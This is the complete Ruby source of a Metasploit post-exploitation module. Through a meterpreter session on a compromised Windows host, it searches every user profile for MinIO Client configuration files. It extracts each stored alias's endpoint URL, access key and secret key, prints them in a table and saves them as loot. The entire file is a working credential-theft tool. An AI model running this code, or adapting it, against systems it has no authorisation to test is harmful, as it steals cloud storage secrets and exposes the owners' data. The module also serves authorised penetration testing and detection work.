##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
#
# @blurbdust based this code off of https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
# and https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/enum_ms_product_keys.rb
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::UserProfiles

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather MinIO Client Key',
        'Description' => %q{
          This is a module that searches for MinIO Client credentials on a windows remote host.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'https://blog.kali-team.cn/Metasploit-MinIO-Client-7d940c60ae8545aeaa29c96536dda855' ]
        ],
        'Author' => ['Kali-Team <kali-team[at]qq.com>'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_railgun_api
              stdapi_railgun_api_multi
              stdapi_railgun_memread
              stdapi_railgun_memwrite
              stdapi_sys_process_get_processes
            ]
          }
        }
      )
    )
    register_options(
      [
        OptString.new('CONFIG_PATH', [ false, 'Specifies the config file path for MinIO Client']),
      ]
    )
  end

  def parser_minio(config_path)
    print_status("Parsing file #{config_path}")
    some_result = Hash.new
    if file?(config_path)
      file_contents = read_file(config_path)
      if file_contents.nil? || file_contents.empty?
        print_warning('Configuration file content is empty')
        return some_result
      else
        begin
          configuration = JSON.parse(file_contents)
          if !configuration['aliases'].nil?
            some_result = configuration['aliases']
          end
        rescue JSON::ParserError => e
          elog('Unable to parse configuration', error: e)
        end
      end
    end
    return some_result
  end

  def print_and_save(all_result)
    columns = [
      'name',
      'url',
      'accessKey',
      'secretKey',
      'api',
      'path',
    ]
    tbl = Rex::Text::Table.new(
      'Header' => 'MinIO Client Key',
      'Columns' => columns
    )
    all_result.each do |results|
      results.each do |name, item|
        row = [name] + item.values
        tbl << row
      end
    end

    print_line(tbl.to_s)
    if tbl.rows.count > 0
      path = store_loot('host.minio', 'text/plain', session, tbl, 'minio_client.txt', 'MinIO Client Key')
      print_good("Session info stored in: #{path}")
    end
  end

  def run
    # used to grab files for each user on the remote host
    all_result = []
    config_path = datastore['CONFIG_PATH'] || ''
    if config_path.empty?
      grab_user_profiles.each do |user_profiles|
        next if user_profiles['ProfileDir'].nil?

        all_result << parser_minio(user_profiles['ProfileDir'] + '\\mc\\config.json')
      end
    else
      all_result << parser_minio(config_path)
    end
    print_and_save(all_result)
  end
end
